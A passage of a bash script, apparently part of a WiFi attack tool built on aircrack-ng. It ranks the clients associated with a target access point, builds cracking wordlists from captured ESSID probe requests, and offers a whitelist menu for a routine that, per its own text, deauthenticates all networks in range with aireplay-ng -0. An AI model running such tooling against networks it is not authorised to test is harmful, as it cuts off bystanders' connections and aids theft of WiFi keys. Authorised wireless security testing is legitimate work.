cat < /tmp/HANDTEST/$bssid-01.txt | awk -F"," '/1/ {print $1 $2 $3  }' > /tmp/HANDTEST/$bssid-02.txt

sleep .5

#Strip down to three(3) entries 

cat < /tmp/HANDTEST/$bssid-02.txt | dos2unix -f | tr [a-f] [A-F]  | awk -F' ' '{ if((length($3) == 17 )) {print $1" " $2 " " $3 }}' > /tmp/HANDTEST/$bssid-03.txt

sleep .5

#Remove the mon0 ie data produced by self from the list

#Move to uppercase to match aircrack-ng text output

MACRMV="$VARMAC"

MACRMV=$(echo $MACRMV | awk '{print toupper($0)}')

#To uppercase
#bssid=$(echo $bssid | tr [a-f] [A-F])

cat < /tmp/HANDTEST/$bssid-03.txt | dos2unix -f | awk -v mon=$MACRMV -F' ' '{ if($1 != mon ) {print $0}}' > /tmp/HANDTEST/$bssid-04.txt

sleep .5

#Remove all but target

cat < /tmp/HANDTEST/$bssid-04.txt | dos2unix -f | awk -v targetap=$bssid -F' ' '{ if($3 == targetap) {print $0}}' > /tmp/HANDTEST/$bssid-05.txt

sleep .5

#Print file with just data value could remove if statement

#Find highest value

cat < /tmp/HANDTEST/$bssid-05.txt | dos2unix -f | awk -v targetap=$bssid -F' ' '{ if($3 == targetap) {print $2}}' > /tmp/HANDTEST/$bssid-06.txt

sleep .5

#### Start Working ###

#### Build History of associated macs####

if [ ! -f  "/root/VARMAC_AIRCRACK/$TARGETAP-client.txt" ]; then

	touch /root/VARMAC_AIRCRACK/$bssid-client.txt

	fi

if [ ! -f  "/root/VARMAC_AIRCRACK/$TARGETAP-client.txt" ]; then

	touch /tmp/$bssid-client.txt

	fi

MAXDAT=
CLIASO_MAX=
CLIASO_MID=
CLIASO_LOW=

MAXDAT=$(awk '{for(i=1;i<=NF;i++) if($i>maxval) maxval=$i;}; END { print maxval;}' /tmp/HANDTEST/$bssid-06.txt)

sleep .5

CLIASO_MAX=$(cat < /tmp/HANDTEST/$bssid-05.txt | dos2unix -f | awk -v maxdat=$MAXDAT -F' ' '{ if($2 == maxdat) {print $1}}')

sleep .5

cat < /tmp/HANDTEST/$bssid-05.txt | dos2unix -f | awk -v maxdat=$MAXDAT -F' ' '{ if($2 != maxdat) { print $0 }}' > /tmp/HANDTEST/$bssid-05a.txt

sleep .5

#Find middle value of top three

cat < /tmp/HANDTEST/$bssid-05a.txt | dos2unix -f | awk -v maxdat=$MAXDAT -F' ' '{ if($2 != maxdat) {print $2}}' > /tmp/HANDTEST/$bssid-06a.txt

sleep .5

MAXDAT=$(awk '{for(i=1;i<=NF;i++) if($i>maxval) maxval=$i;}; END { print maxval;}' /tmp/HANDTEST/$bssid-06a.txt)

sleep .5

CLIASO_MID=$(cat < /tmp/HANDTEST/$bssid-05a.txt | dos2unix -f | awk -v maxdat=$MAXDAT -F' ' '{ if($2 == maxdat) {print $1}}')

sleep .5

cat < /tmp/HANDTEST/$bssid-05a.txt | dos2unix -f | awk -v maxdat=$MAXDAT -F' ' '{ if($2 != maxdat) {print $0}}' > /tmp/HANDTEST/$bssid-05b.txt

sleep .5

cat < /tmp/HANDTEST/$bssid-05b.txt | dos2unix -f | awk -v maxdat=$MAXDAT -F' ' '{ if($2 != maxdat) {print $2}}' > /tmp/HANDTEST/$bssid-06b.txt

sleep .5

MAXDAT=$(awk '{for(i=1;i<=NF;i++) if($i>maxval) maxval=$i;}; END { print maxval;}' /tmp/HANDTEST/$bssid-06b.txt)

sleep .5

CLIASO_LOW=$(cat < /tmp/HANDTEST/$bssid-05b.txt | dos2unix -f | awk -v maxdat=$MAXDAT -F' ' '{ if($2 == maxdat) {print $1}}')

#Write variables for historical record

	if [[ ! -z $CLIASO_MAX ]]; then

		echo " $CLIASO_MAX" >> /tmp/$bssid-client.txt

			fi

	if [[ ! -z $CLIASO_MID ]]; then

		echo " $CLIASO_MID" >> /tmp/$bssid-client.txt

			fi

	if [[ ! -z $CLIASO_LOW ]]; then

		echo " $CLIASO_LOW" >> /tmp/$bssid-client.txt

			fi

cat < /root/VARMAC_AIRCRACK/$bssid-client.txt >> /tmp/$bssid-client.txt

rm -f /root/VARMAC_AIRCRACK/$bssid-client.txt

cat < /tmp/$bssid-client.txt | sort -u > /root/VARMAC_AIRCRACK/$bssid-client.txt

rm -f /tmp/$bssid-client.txt

######

echo -e "$txtrst[+]$info Clients that have been seen associated to $bssid see:$txtrst"
sleep 1
echo -e  "[+]"
sleep 1
echo -e "$txtrst[+]   root/VARMAC_AIRCRACK/$bssid-client.txt"
sleep 1
echo -e  "[+]"
sleep 1
echo -e "$txtrst[+]$info Clients currently associated to $bssid $txtrst"
sleep 1
echo -e "$txtrst[+]$info arranged by order of activity are listed below:"
sleep 1
echo -e "$txtrst[+]"
sleep 1
#check var not null

if [[ ! -z $CLIASO_MAX ]]; then
	
	echo -e "$txtst[+] $CLIASO_MAX"

	else
	sleep 1
#	echo -e "$txtrst[+]"
	echo -e "$txtrst[+] No clients are currently associated to $bssid"
#	echo -e "$txtrst[+]"

		fi

if [[ ! -z $CLIASO_MID ]]; then
	sleep 1
	echo -e "$txtst[+] $CLIASO_MID"

		fi

if [[ ! -z $CLIASO_LOW ]]; then
	sleep 1
	echo -e "$txtst[+] $CLIASO_LOW"

		fi

	fi

		fi # Linked to[[ $shakstat == 0 ]]; then

}

#~~~~~~~~~~~~~~Start ESSIDPROBE_fn Start~~~~~~~~~~~~~~# 

ESSIDPROBE_fn()

{

# Copy files from folder used by handshake harvest

rm -f /tmp/ESSIDPROBE_DIR/*.kismet.csv

if [ ! -f  "/tmp/ESSIDPROBE_DIR/allcsv.txt" ]; then

	touch /tmp/ESSIDPROBE_DIR/allcsv.txt

	fi

#countcsv1=`ls -A /root/*.csv 2>/dev/null | wc -l`

#echo " 315 debug /root/*.csv $countcsv1"

#	if [[ $countcsv1 != 0 ]] && [[ $countcsv1 != $countcsv ]]; then

#		cat /root/*.csv >> /tmp/ESSIDPROBE_DIR/allcsv.txt

#			fi


countcsv1=`ls -A /tmp/ESSIDPROBE_DIR/*.csv 2>/dev/null | wc -l`

#	echo " 324 debug /tmp/ESSIDPROBE_DIR/*.csv $countcsv1"

if [[ $countcsv1 != 0 ]]; then

cat /tmp/ESSIDPROBE_DIR/*.csv >> /tmp/ESSIDPROBE_DIR/allcsv.txt

sleep 1

rm -f /tmp/ESSIDPROBE_DIR/*.csv

countcsv1=`ls -A /tmp/ESSIDPROBE_DIR/allcsv.txt 2>/dev/null | wc -l`

	fi

sleep .1

###############################

# Sed commentary for MTeam prog
#sed 's/^[ \t]*//;s/[ \t]*$//' = Remove begin and end
#sed 's/.$//' = Convert to unix
#sed '/^$/d' remove blank lines
#sed 's/,/ /g' replace comma wih space
#dos2unix -f force to binary try and remove

#if [[ $KALI_TYPE == 1 ]]; then

#cat < /tmp/ESSIDPROBE_DIR/allcsv.txt | awk -F' ' '{ if((length($8) == 18 )) {$1=$2=$3=$4=$5=$6=$7=$8=""; print $0 }}' | dos2unix -f | sed 's/^[ \t]*//;s/[ \t]*$//' | sed '/^$/d' > /tmp/ESSIDPROBE_DIR/hold01a.txt

#		fi

if [[ $KALI_TYPE == 2 ]] || [[ $KALI_TYPE == 3 ]] ; then

cat < /tmp/ESSIDPROBE_DIR/allcsv.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=""; print $0 }}' | dos2unix -f | sed 's/.$//;s/^[ \t]*//;s/[ \t]*$//' | sed '/^$/d' > /tmp/ESSIDPROBE_DIR/hold01a.txt

		fi

sleep .2

#Field 1
echo "[+] Writing ESSID probes Field 1"
cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $1 }' > /tmp/ESSIDPROBE_DIR/holdfield01a.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $1 $2 }' > /tmp/ESSIDPROBE_DIR/holdfield01b.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $1 $2 $3 }' > /tmp/ESSIDPROBE_DIR/holdfield01c.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $1 " " $2 }' > /tmp/ESSIDPROBE_DIR/holdfield01d.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $1 " " $2 " " $3 }' > /tmp/ESSIDPROBE_DIR/holdfield01e.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $2 " " $3 }' > /tmp/ESSIDPROBE_DIR/holdfield01f.txt

#Field 2
echo "[+] Writing ESSID probes Field 2"
cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $2 }' > /tmp/ESSIDPROBE_DIR/holdfield02a.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $2 $3 }' > /tmp/ESSIDPROBE_DIR/holdfield02b.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $2 $3 $4 }' > /tmp/ESSIDPROBE_DIR/holdfield02c.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $2 " " $3 " " $4 }' > /tmp/ESSIDPROBE_DIR/holdfield02e.txt

#Field 3
echo "[+] Writing ESSID probes Field 3"
cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $3 }' > /tmp/ESSIDPROBE_DIR/holdfield03a.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $3 $4 }' > /tmp/ESSIDPROBE_DIR/holdfield03b.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $3 $4 $5 }' > /tmp/ESSIDPROBE_DIR/holdfield03c.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $3 " " $4 }' > /tmp/ESSIDPROBE_DIR/holdfield03d.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $3 " " $4 " " $5 }' > /tmp/ESSIDPROBE_DIR/holdfield03e.txt

#Field 4
echo "[+] Writing ESSID probes Field 4"
cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $4 }' > /tmp/ESSIDPROBE_DIR/holdfield04a.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $4 $5 }' > /tmp/ESSIDPROBE_DIR/holdfield04b.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $4 $5 $6 }' > /tmp/ESSIDPROBE_DIR/holdfield04c.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $4 " " $5 }' > /tmp/ESSIDPROBE_DIR/holdfield04d.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $4 " " $5 " " $6 }' > /tmp/ESSIDPROBE_DIR/holdfield04e.txt

#Field 5
echo "[+] Writing ESSID probes Field 5"
cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $5 }' > /tmp/ESSIDPROBE_DIR/holdfield05a.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $5 $6 }' > /tmp/ESSIDPROBE_DIR/holdfield05b.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $5 $6 $7 }' > /tmp/ESSIDPROBE_DIR/holdfield05c.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $5 " " $6 }' > /tmp/ESSIDPROBE_DIR/holdfield05d.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $5 " " $6 " " $7 }' > /tmp/ESSIDPROBE_DIR/holdfield05e.txt

#Field 6
echo "[+] Writing ESSID probes Field 6"
cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $6 }' > /tmp/ESSIDPROBE_DIR/holdfield06a.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $6 $7 }' > /tmp/ESSIDPROBE_DIR/holdfield06b.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $6 $7 $8 }' > /tmp/ESSIDPROBE_DIR/holdfield06c.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $6 " " $7 }' > /tmp/ESSIDPROBE_DIR/holdfield06d.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $6 " " $7 " " $8 }' > /tmp/ESSIDPROBE_DIR/holdfield06e.txt

#Field 7
echo "[+] Writing ESSID probes Field 7"
cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $7 }' > /tmp/ESSIDPROBE_DIR/holdfield07a.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $7 $8 }' > /tmp/ESSIDPROBE_DIR/holdfield07b.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $7 $8 $9 }' > /tmp/ESSIDPROBE_DIR/holdfield07c.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $7 " " $8 }' > /tmp/ESSIDPROBE_DIR/holdfield07d.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $7 " " $8 " " $9 }' > /tmp/ESSIDPROBE_DIR/holdfield07e.txt

#Field 8
echo "[+] Writing ESSID probes Field 8"
cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $8 }' > /tmp/ESSIDPROBE_DIR/holdfield08a.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $8 $9 }' > /tmp/ESSIDPROBE_DIR/holdfield08b.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $8 $9 $10 }' > /tmp/ESSIDPROBE_DIR/holdfield08c.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $8 " " $9 }' > /tmp/ESSIDPROBE_DIR/holdfield08d.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $8 " " $9 " " $10 }' > /tmp/ESSIDPROBE_DIR/holdfield08e.txt

#Field 9
echo "[+] Writing ESSID probes Field 9"
cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $9 }' > /tmp/ESSIDPROBE_DIR/holdfield09a.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $9 $10 }' > /tmp/ESSIDPROBE_DIR/holdfield09b.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $9 $10 $11 }' > /tmp/ESSIDPROBE_DIR/holdfield09c.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $9 " " $10 }' > /tmp/ESSIDPROBE_DIR/holdfield09d.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $9 " " $10 " " $11 }' > /tmp/ESSIDPROBE_DIR/holdfield09e.txt

#Field 10
echo "[+] Writing ESSID probes Field 10"
cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $10 }' > /tmp/ESSIDPROBE_DIR/holdfield10a.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $10 $11 }' > /tmp/ESSIDPROBE_DIR/holdfield10b.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $10 $11 $12 }' > /tmp/ESSIDPROBE_DIR/holdfield10c.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $10 " " $11 }' > /tmp/ESSIDPROBE_DIR/holdfield10d.txt

cat < /tmp/ESSIDPROBE_DIR/hold01a.txt | awk '{ print $10 " " $11 " " $12 }' > /tmp/ESSIDPROBE_DIR/holdfield10e.txt

cat /tmp/ESSIDPROBE_DIR/holdfield*.txt >> /tmp/ESSIDPROBE_DIR/holdall16.txt

rm -f /tmp/ESSIDPROBE_DIR/holdfield*.txt

sleep 2

# Removes white spaces from left, limits length, sorts and removes duplicates

#cat /tmp/ESSIDPROBE_DIR/holdall16.txt | sed 's/,/ /g' | sed 's/^[ \t]*//;s/[ \t]*$//' | LC_ALL=C awk 'length($0) > 2' | sort -u > /tmp/ESSIDPROBE_DIR/essidprobesdichold01.txt

#Remove binary with
#at essidprobesdic-test.txt | LC_ALL=C sed 's/[\x80-\xFF]//g' > essidprobesdic-test01.txt

cat /tmp/ESSIDPROBE_DIR/holdall16.txt | sed 's/,/ /g' | sed 's/^[ \t]*//;s/[ \t]*$//' | LC_ALL=C sed 's/[\x80-\xFF]//g' | LC_ALL=C awk 'length($0) > 2' | sort -u > /tmp/ESSIDPROBE_DIR/essidprobesdichold01.txt

echo "[+] Sorting essidprobesdic.txt"
sleep .2

cat /root/PROBEESSID_DATA/essidprobesdic.txt  > /tmp/ESSIDPROBE_DIR/essidprobesdichold02.txt

sleep .2

rm -f /root/PROBEESSID_DATA/essidprobesdic.txt

cat  /tmp/ESSIDPROBE_DIR/essidprobesdichold01.txt /tmp/ESSIDPROBE_DIR/essidprobesdichold02.txt > /tmp/ESSIDPROBE_DIR/essidprobesdichold03.txt

sleep .2

# shorter strings

cat /tmp/ESSIDPROBE_DIR/essidprobesdichold03.txt | sed 's/^[ \t]*//;s/[ \t]*$//' | LC_ALL=C awk 'length($0) > 2' | sort -u > /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt

sleep .2

cat /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | sort -u > /tmp/ESSIDPROBE_DIR/essidprobesdichold05.txt

sleep .2

cp -f /tmp/ESSIDPROBE_DIR/essidprobesdichold05.txt /root/PROBEESSID_DATA/essidprobesdic.txt

echo "[+] Transfering essidprobesdic.txt to /root/PROBEESSID_DATA/"

cat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=""; print $1 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05a.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=""; print $2 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05b.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=""; print $3 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05c.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=""; print $4 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05d.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=""; print $5 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05e.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=""; print $6 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05f.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=""; print $7 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05g.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=""; print $8 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05h.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=""; print $9 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05i.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesdichold04.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {$1=$2=$3=$4=$5=$6=""; print $10 }}' > /tmp/ESSIDPROBE_DIR/essidrefhold-05j.txt

cat /tmp/ESSIDPROBE_DIR/essidrefhold-05*.txt >> /tmp/ESSIDPROBE_DIR/essidrefhold05.txt

cat /tmp/ESSIDPROBE_DIR/essidprobesdichold05.txt | sed s'/,/ /'g | sed 's/     / /g' | sed 's/    / /g' | sed 's/   / /g' | sed 's/  / /g' | sed 's/ / /g' > /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $1 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX18dic.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $2 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX28dic.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $3 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX38dic.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $4 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX48dic.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $5 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX58dic.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $6 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX68dic.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $7 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX78dic.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $8 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX88dic.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $9 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX98dic.txt

cat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $10 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX108dic.txt

cat /tmp/ESSIDPROBE_DIR/essidprobesi*.txt >> /tmp/ESSIDPROBE_DIR/essidprobes11dic.txt

cat /tmp/ESSIDPROBE_DIR/essidprobes11dic.txt | sed 's/^[ \t]*//;s/[ \t]*$//' > /tmp/ESSIDPROBE_DIR/essidprobes12dic.txt

echo "[+] Sorting essidprobes8dic.txt"

rm -f /tmp/ESSIDPROBE_DIR/essidprobesi*.txt

cat /tmp/ESSIDPROBE_DIR/essidprobes12dic.txt | LC_ALL=C awk 'length($0) > 7' > /tmp/ESSIDPROBE_DIR/essidprobes13dic.txt

cat /tmp/ESSIDPROBE_DIR/essidprobes13dic.txt |  sort -u  > /tmp/ESSIDPROBE_DIR/essidprobes14dic.txt

echo "[+] Transfering essidprobes8dic.txt to /root/PROBEESSID_DATA/"

cp -f /tmp/ESSIDPROBE_DIR/essidprobes14dic.txt /root/PROBEESSID_DATA/essidprobes8dic.txt 

sleep .2

}

#~~~~~~~~~~~~~~End ESSIDPROBE_fn End~~~~~~~~~~~~~~#

ESSIDREF_fn()

{
### essidreference ###


echo "[+] Writing ESSID Reference"
cat < /tmp/ESSIDPROBE_DIR/allcsv.txt | awk 'BEGIN { FS ="," } ; { if((length($6) == 18 )) {print $1 " " $6 " " $7 " " $8 " " $9 " " $10 " " $11 }}' | sed 's/^[ \t]*//;s/[ \t]*$//' | sed '/^$/d' > /tmp/ESSIDPROBE_DIR/essidrefhold01.txt

sleep 2

cp -f /root/PROBEESSID_DATA/essidrefhold.txt /tmp/ESSIDPROBE_DIR/essidrefhold03.txt

cat /tmp/ESSIDPROBE_DIR/essidrefhold01.txt >> /tmp/ESSIDPROBE_DIR/essidrefhold03.txt

sleep .2
 
cat /tmp/ESSIDPROBE_DIR/essidrefhold03.txt | sed 's/  / /g' | awk '{if(($3 != "")) {print $0 }}' >> /tmp/ESSIDPROBE_DIR/essidrefhold03c.txt

cat /tmp/ESSIDPROBE_DIR/essidrefhold03c.txt | awk '{if(($4 != "")) {print $0 }}' >> /tmp/ESSIDPROBE_DIR/essidrefhold03b.txt

cat /tmp/ESSIDPROBE_DIR/essidrefhold03b.txt | awk '{if(($3 != "")) {print $0 }}' >> /tmp/ESSIDPROBE_DIR/essidrefhold03a.txt
echo "[+] Writing ESSID Reference Sort"
cat /tmp/ESSIDPROBE_DIR/essidrefhold03a.txt | sort -u | uniq -u > /tmp/ESSIDPROBE_DIR/essidrefhold04.txt

sleep .2

rm -f /root/PROBEESSID_DATA/essidrefhold.txt

sleep .2

cp -f /tmp/ESSIDPROBE_DIR/essidrefhold04.txt /root/PROBEESSID_DATA/essidrefhold.txt

sleep .2

echo "[+] Copying any ESSID Probes obtained thru"
echo "[+] airodump-ng to the /root/PROBEESSID_DATA folder"

rm -f /tmp/ESSIDPROBE_DIR/*.csv

sleep 3

}

#~~~~~~~~~~~~~~End ESSIDPROBE_fn End~~~~~~~~~~~~~~#

white_ap_mac_fn()
{

WHITELTEST=ZZZ

clear

until  [ $WHITELTEST == y ] || [ $WHITELTEST == Y ]; do  


echo ""
echo ""
echo -e "$info$bold  $undr White Listing Networks $txtrst"
echo ""


echo -e "$info     This script will deauth ALL Networks within the reception range"
echo -e "  of the wifi device. You can White-List any network and that network will"
echo -e "  not undergo deauthorization from aireplay-ng -0. Mac addresses of those"
echo -e "  networks you wish to white-list will be required."
echo ""
echo -e "$inp     If you wish to whitelist any networks. Enter$yel (y/Y)$q."
echo -e "$inp  Enter$yel (n/N)$inp to not use the feature.$txtrst"
echo -e "$txtrst"

	read -p "   Enter y/Y/n/N: " WHITEL

	if [[ $ERRORCHK == n ]] || [[ $ERRORCHK == N ]]; then

	WHITELTEST=y

	else

	while true
	do

echo ""
echo -e  "$inp      You entered$yel $WHITEL$inp,  select$yel (y/Y)$inp to continue."
echo -e  "$inp  Select$yel (n/N)$inp to try again.$txtrst"
echo -e "$txtrst"

	read -p "   Confirm: " WHITELTEST

	case $WHITELTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

	fi

	clear
		done

if  [ $WHITEL == y ] || [ $WHITEL == Y ]; then

whitelist=$(ls -A /root/HANDSHAKEHOLD/* | xargs -0 -n 1 basename | dos2unix -f | awk -F "-" '/whitelist/ {print $1 "-" $2 }')  # > /tmp/HANDTEST/whitelist

                 if [[ -z $whitelist ]]; then
	echo ""
	echo -e "$info    There are currently no Networks Listed whitelisted."

		else

	echo ""
	echo -e "$info    Networks currently whitelisted are seen below. If you wish"
	echo -e "$info  to remove any whitelisted Networks open the$yel /root/HANDSHAKEHOLD"
	echo -e "$info  folder and delete the whitelist file from the folder.$txtrst"
	echo ""
	echo "$whitelist"

			fi

	echo ""
	echo -e "$inp    Enter the mac address of the device you wish to White-List."
        echo -e "$inp  Enter in this format$yel 55:44:33:22:11:00$inp ONLY!!!"
        echo ""
        echo -e "$info Some error handeling exists for this entry."
	echo -e "$txtrst"
	
	read -p "   Enter Mac Code: " ap_mac

			white_ap_mac_test_fn

		fi

}

#~~~~~~~~~~~~~~~Start  Mac Error Handling Star~~~~~~~~~~~~~~~#

white_ap_mac_test_fn()

{

# Error Handling For Mac Code Entries
# Tests Length of string
# Tests  Presence of only ::::: punctuation characters
# Tests only hex charcters present
#Sets correct puntuation for test

MACPUNCT=":::::"

sleep .2

#Tests punctuation

PUNCTEST=`echo "$ap_mac" | tr -d -c ".[:punct:]"`

sleep .2

if [ "$PUNCTEST" == "$MACPUNCT" ]

	then

	    PUNCT=1

	else

	    PUNCT=0

	fi

sleep .2

#Tests hex characters

MACALNUM=`echo "$ap_mac" | tr -d -c ".[:alnum:]"`

sleep .2

if [[ $MACALNUM =~ [A-Fa-f0-9]{12} ]]

then

	ALNUM=1
else

	ALNUM=0
  fi

sleep .2

#Tests string length

if [ ${#ap_mac} = 17 ]

then

	MACLEN=1
else

	MACLEN=0
  fi

sleep .2

# All variables set to ones  and zeros

until [ $MACLEN == 1 ] && [ $PUNCT == 1 ] && [ $ALNUM == 1 ]; do

	if [ $ALNUM == 0 ]; then
		echo -e "$warn  You are using a non-hex character.$txtrst"

			fi
	
	if [ $MACLEN == 0 ]; then
		echo -e "$warn  Your Mac code is the wrong length.$txtrst"

			fi

	if [ $PUNCT == 0 ]; then

		echo -e "$warn  You have entered the wrong and/or too many separators - use ONLY colons :$txtrst"

			fi

	echo -e "$info  Mac code entry incorrect!!!"
        echo "  You must use format 00:11:22:33:44:55 or aa:AA:bb:BB:cc:CC."
	echo "  Only a thru f, A thru F, 0 thru 9 and the symbol :  are allowed."
	echo -e "$inp  Reenter Mac code and try again(ap_mac)."
	echo -e "$txtrst"

	read -p "   Enter: " ap_mac

        MACALNUM=`echo "$ap_mac" | tr -d -c ".[:alnum:]"`
	if [[ $MACALNUM =~ [A-Fa-f0-9]{12} ]]

        then

        	ALNUM=1

        else

	        ALNUM=0

			fi

sleep .2       

	if [ ${#ap_mac} == 17 ]

	then

		MACLEN=1
	else

		MACLEN=0

			fi

sleep .2

	PUNCTEST=`echo "$ap_mac" | tr -d -c ".[:punct:]"`
	if [ $PUNCTEST == $MACPUNCT ]

	then

	    PUNCT=1

	else

	    PUNCT=0

			fi

sleep 1

done

echo $ap_mac > /root/HANDSHAKEHOLD/$ap_mac-whitelist
sleep 1

echo -e "$inp     Enter$yel (y/Y)$inp to white list another device."
echo -e "$inp  Enter$yel (n/N)$inp to continue to main program."
echo -e "$txtrst"

	read -p "   Confirm: " ANOTHER

